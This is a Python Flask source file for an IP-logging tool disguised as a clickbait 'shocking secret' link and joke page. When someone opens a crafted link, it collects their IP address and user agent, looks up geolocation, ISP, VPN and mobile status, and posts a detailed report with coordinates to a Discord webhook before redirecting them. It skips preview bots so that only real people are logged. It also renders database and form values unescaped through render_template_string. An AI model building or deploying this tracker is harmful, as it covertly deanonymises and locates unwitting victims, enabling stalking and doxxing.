import logging
import base64
import httpagentparser
import requests
import random
from flask import Flask, request, render_template_string, jsonify, g, session, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from flask_wtf.csrf import CSRFProtect
from flask_migrate import Migrate
from flask_caching import Cache
from flask_babel import Babel, lazy_gettext
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.middleware.proxy_fix import ProxyFix
from dotenv import load_dotenv
from functools import wraps
import os
import asyncio

# Load environment variables from .env file
load_dotenv()

# Initialize Flask app
app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY")
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['BABEL_DEFAULT_LOCALE'] = 'ru'
app.config['CACHE_TYPE'] = 'SimpleCache'
app.config['CACHE_DEFAULT_TIMEOUT'] = 300

# Initialize extensions
db = SQLAlchemy(app)
migrate = Migrate(app, db)
csrf = CSRFProtect(app)
cache = Cache(app)
babel = Babel(app)

# Proxy fix for headers
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=2, x_proto=1, x_host=1)

# Logging configuration
logging.basicConfig(level=os.getenv("LOGGING_LEVEL"))

# Load fixed configuration values
CLICKBAIT_TITLE = lazy_gettext("😱 SHOCK! You won't believe this fact has been hidden for years...")
CLICKBAIT_DESCRIPTION = lazy_gettext("🔥 EXCLUSIVE! This was supposed to stay secret, but it leaked online. Quick, see it before it's deleted!")
CLICKBAIT_IMAGE = "https://avatars.mds.yandex.net/i?id=a4aecf9cbc80023011c1e098ff28befc5fa6d0b6-8220915-images-thumbs&n=13"

# Global click counter
click_count = 0

# Configuration for logging images
config = {
    "webhook": os.getenv("DISCORD_WEBHOOK_URL"),
    "image": CLICKBAIT_IMAGE,
    "imageArgument": True,
    "username": "ZeWardo",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": lazy_gettext("Hello, world!"),
        "richMessage": True,
    },
    "vpnCheck": int(os.getenv("VPN_CHECK")),
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": int(os.getenv("ANTI_BOT")),
    "redirect": {
        "redirect": True,
        "page": os.getenv("REAL_URL")
    },
}

# List of jokes
jokes = [
    lazy_gettext("Why do programmers have bad dreams? Because they wake up from bugs!"),
    lazy_gettext("What do you call a programmer without a hand? Left-handed."),
    lazy_gettext("Why don't programmers like nature? Because there are too many bugs!"),
    lazy_gettext("What do you call a programmer who understands alcohol? An alcoholic."),
    lazy_gettext("Why don't programmers go to bars? Because there are too many bugs!"),
    lazy_gettext("What do you call a programmer who understands music? A musician."),
    lazy_gettext("Why don't programmers like coffee? Because it causes too many bugs!"),
    lazy_gettext("What do you call a programmer who understands art? An artist."),
    lazy_gettext("Why don't programmers go to the movies? Because there are too many bugs!"),
    lazy_gettext("What do you call a programmer who understands sports? An athlete.")
]

# Database model
class Link(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    path = db.Column(db.String(50), unique=True, nullable=False)
    title = db.Column(db.String(200), nullable=False)
    description = db.Column(db.String(500), nullable=False)
    image_url = db.Column(db.String(500), nullable=False)
    redirect_url = db.Column(db.String(500), nullable=False)
    redirect_delay = db.Column(db.Integer, default=5)
    click_count = db.Column(db.Integer, default=0)

# Bot check function
def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

# Error reporting function
def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": lazy_gettext("ZeWorld - Error"),
                "color": config["color"],
                "description": f"An error occurred while trying to log the IP!\n\n**Error:**\n\n{error}\n",
            }
        ],
    })

# Report generation function
def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    bot = botCheck(ip, useragent)

    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": lazy_gettext("Zewardo - Link Sent"),
                    "color": config["color"],
                    "description": f"A **Zewardo** link was sent to the chat!\nYou might receive the IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }
            ],
        }) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()

        # Check for 'proxy' key in response
        if 'proxy' in info and info["proxy"]:
            if config["vpnCheck"] == 2:
                return
            if config["vpnCheck"] == 1:
                ping = ""

        if 'hosting' in info and info["hosting"]:
            if config["antiBot"] == 4:
                if info.get("proxy"):
                    pass
                else:
                    return
            if config["antiBot"] == 3:
                return
            if config["antiBot"] == 2:
                if info.get("proxy"):
                    pass
                else:
                    ping = ""
            if config["antiBot"] == 1:
                ping = ""

        os, browser = httpagentparser.simple_detect(useragent)

        # Safe access to timezone information
        timezone_parts = info.get('timezone', 'Unknown/Unknown').split('/')
        timezone_name = timezone_parts[1].replace('_', ' ') if len(timezone_parts) > 1 else 'Unknown'
        timezone_region = timezone_parts[0] if len(timezone_parts) > 1 else 'Unknown'

        embed = {
            "username": config["username"],
            "content": ping,
            "embeds": [
                {
                    "title": lazy_gettext("Zewardo - IP Logged"),
                    "color": config["color"],
                    "description": f"""**User opened the original image!**

**Endpoint:** `{endpoint}`

**IP Information:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coordinates:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Exact, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{timezone_name}` ({timezone_region})
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', 'False') if info.get('hosting') and not info.get('proxy') else 'Possible' if info.get('hosting') else 'False'}`

**PC Information:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
                }
            ],
        }

        if url:
            embed["embeds"][0].update({"thumbnail": {"url": url}})
        requests.post(config["webhook"], json=embed)
        return info

    except Exception as e:
        logging.error(f"Error processing IP information: {e}")
        return

# Admin login required decorator
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

# Admin login route
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == os.getenv("ADMIN_USERNAME") and check_password_hash(os.getenv("ADMIN_PASSWORD_HASH"), password):
            session['logged_in'] = True
            return redirect(url_for('admin_dashboard'))
        return lazy_gettext("Invalid credentials"), 401
    return render_template_string('''
        <form method="post">
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
    ''')

# Admin logout route
@app.route('/admin/logout')
def admin_logout():
    session.pop('logged_in', None)
    return redirect(url_for('admin_login'))

# Admin dashboard route
@app.route('/admin')
@login_required
def admin_dashboard():
    links = Link.query.all()
    links_html = "<table><tr><th>Path</th><th>Title</th><th>Clicks</th><th>Actions</th></tr>"
    for link in links:
        links_html += f"""
        <tr>
            <td>{link.path}</td>
            <td>{link.title}</td>
            <td>{link.click_count}</td>
            <td>
                <a href="/admin/links/{link.id}/edit">Edit</a>
                <form method="POST" action="/admin/links/{link.id}/delete">
                    <button type="submit">Delete</button>
                </form>
            </td>
        </tr>
        """
    links_html += "</table>"
    return render_template_string(f'''
        <h1>Admin Dashboard</h1>
        <a href="/admin/links/new">Add New Link</a>
        {links_html}
    ''')

# New link route
@app.route('/admin/links/new', methods=['GET', 'POST'])
@login_required
def new_link():
    if request.method == 'POST':
        new_link = Link(
            path=request.form['path'],
            title=request.form['title'],
            description=request.form['description'],
            image_url=request.form['image_url'],
            redirect_url=request.form['redirect_url'],
            redirect_delay=request.form['redirect_delay']
        )
        db.session.add(new_link)
        db.session.commit()
        return redirect(url_for('admin_dashboard'))
    return render_template_string('''
        <form method="post">
            Path: <input type="text" name="path"><br>
            Title: <input type="text" name="title"><br>
            Description: <input type="text" name="description"><br>
            Image URL: <input type="text" name="image_url"><br>
            Redirect URL: <input type="text" name="redirect_url"><br>
            Redirect Delay: <input type="number" name="redirect_delay"><br>
            <input type="submit" value="Create">
        </form>
    ''')

# Edit link route
@app.route('/admin/links/<int:id>/edit', methods=['GET', 'POST'])
@login_required
def edit_link(id):
    link = Link.query.get_or_404(id)
    if request.method == 'POST':
        link.path = request.form['path']
        link.title = request.form['title']
        link.description = request.form['description']
        link.image_url = request.form['image_url']
        link.redirect_url = request.form['redirect_url']
        link.redirect_delay = request.form['redirect_delay']
        db.session.commit()
        return redirect(url_for('admin_dashboard'))
    return render_template_string(f'''
        <form method="post">
            Path: <input type="text" name="path" value="{link.path}"><br>
            Title: <input type="text" name="title" value="{link.title}"><br>
            Description: <input type="text" name="description" value="{link.description}"><br>
            Image URL: <input type="text" name="image_url" value="{link.image_url}"><br>
            Redirect URL: <input type="text" name="redirect_url" value="{link.redirect_url}"><br>
            Redirect Delay: <input type="number" name="redirect_delay" value="{link.redirect_delay}"><br>
            <input type="submit" value="Update">
        </form>
    ''')

# Delete link route
@app.route('/admin/links/<int:id>/delete', methods=['POST'])
@login_required
def delete_link(id):
    link = Link.query.get_or_404(id)
    db.session.delete(link)
    db.session.commit()
    return redirect(url_for('admin_dashboard'))

# Home route
@app.route('/')
def home():
    joke = random.choice(jokes)
    html_content = f"""
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta property="og:title" content="{lazy_gettext('Joke of the Day')}">
        <meta property="og:description" content="{joke}">
        <meta property="og:type" content="website">
        <meta property="og:url" content="https://ваш-сайт.ru/joke">
        <meta property="og:image" content="https://ваш-сайт.ru/images/og-preview.jpg">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:title" content="{lazy_gettext('Joke of the Day')}">
        <meta name="twitter:description" content="{joke}">
        <meta name="twitter:image" content="https://ваш-сайт.ru/images/og-preview.jpg">
        <title>{lazy_gettext('Joke')}</title>
        <style>
            body {{
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                text-align: center;
                background: linear-gradient(45deg, #ff416c, #ff4b2b);
                color: white;
                height: 100vh;
                margin: 0;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                animation: fadeIn 2s ease;
            }}
            h1 {{
                font-size: 3em;
                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
                margin-bottom: 20px;
            }}
            p {{
                font-size: 1.5em;
                margin: 10px 0;
            }}
            @keyframes fadeIn {{
                from {{ opacity: 0; }}
                to {{ opacity: 1; }}
            }}
        </style>
    </head>
    <body>
        <h1>{lazy_gettext('Joke of the Day')}</h1>
        <p>{joke}</p>
    </body>
    </html>
    """
    return render_template_string(html_content)

# Custom link handler route
@app.route('/<custom_path>')
@cache.cached(timeout=60)
def handle_custom_link(custom_path):
    try:
        link = Link.query.filter_by(path=custom_path).first_or_404()
        link.click_count += 1
        db.session.commit()

        user_ip = (
            request.headers.get('CF-Connecting-IP',  # Priority for Cloudflare
            request.headers.get('X-Forwarded-For', request.remote_addr))
        ).split(',')[0].strip()  # Safe extraction of the first IP

        user_agent = request.headers.get('User-Agent')
        asyncio.run(makeReportAsync(user_ip, user_agent, endpoint=request.path))

        html_content = f"""
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <title>{link.title}</title>
            <!-- Open Graph Meta Tags -->
            <meta property="og:title" content="{link.title}">
            <meta property="og:description" content="{link.description}">
            <meta property="og:image" content="{link.image_url}">
            <meta property="og:url" content="{request.url}">
            <meta property="og:type" content="website">
            <!-- Twitter Cards -->
            <meta name="twitter:card" content="summary_large_image">
            <meta name="twitter:title" content="{link.title}">
            <meta name="twitter:description" content="{link.description}">
            <meta name="twitter:image" content="{link.image_url}">
            <style>
                body {{
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    text-align: center;
                    background: linear-gradient(45deg, #ff416c, #ff4b2b);
                    color: white;
                    height: 100vh;
                    margin: 0;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    animation: fadeIn 2s ease;
                }}
                h1 {{
                    font-size: 3em;
                    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
                    margin-bottom: 20px;
                }}
                p {{
                    font-size: 1.5em;
                    margin: 10px 0;
                }}
                .spinner {{
                    border: 6px solid rgba(255, 255, 255, 0.3);
                    border-top: 6px solid white;
                    border-radius: 50%;
                    width: 50px;
                    height: 50px;
                    animation: spin 1s linear infinite;
                    margin: 20px auto;
                }}
                @keyframes fadeIn {{
                    from {{ opacity: 0; }}
                    to {{ opacity: 1; }}
                }}
                @keyframes spin {{
                    0% {{ transform: rotate(0deg); }}
                    100% {{ transform: rotate(360deg); }}
                }}
                .button {{
                    background: white;
                    color: #ff416c;
                    border: none;
                    padding: 15px 30px;
                    font-size: 1.2em;
                    border-radius: 10px;
                    cursor: pointer;
                    margin-top: 20px;
                    transition: background 0.3s, color 0.3s;
                }}
                .button:hover {{
                    background: #ff4b2b;
                    color: white;
                }}
            </style>
            <script>
                setTimeout(function() {{
                    window.location.href = "{link.redirect_url}";
                }}, {link.redirect_delay * 1000});
            </script>
        </head>
        <body>
            <h1>{link.title}</h1>
            <p>{lazy_gettext('Shocked? 😱 In {delay} seconds, you will know the truth!')}</p>
            <div class="spinner"></div>
            <button class="button" onclick="window.location.href='{link.redirect_url}'">{lazy_gettext('Learn the Truth')}</button>
        </body>
        </html>
        """
        return render_template_string(html_content)
    except Exception as e:
        logging.error(f"Error: {e}")
        return lazy_gettext("Error"), 500

# Asynchronous report function
async def makeReportAsync(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    await asyncio.sleep(1)  # Simulate async operation
    makeReport(ip, useragent, coords, endpoint, url)

if __name__ == '__main__':
    host = "0.0.0.0"
    port = 5000
    app.run(host=host, port=port, debug=False)